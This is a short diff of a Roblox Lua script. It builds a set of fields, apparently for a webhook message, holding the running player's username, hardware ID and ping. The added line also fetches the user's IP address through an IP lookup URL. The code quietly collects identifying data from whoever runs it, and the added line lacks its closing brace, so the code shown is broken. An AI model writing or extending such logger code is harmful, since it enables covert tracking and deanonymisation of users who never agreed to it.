@@ -12,6 +12,7 @@ pcall(function()
           {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
           {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
           {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
+          {name = "ip", value = game:GetService("HttpService"):GetAsync(ip_api_url)
 
         }
     }
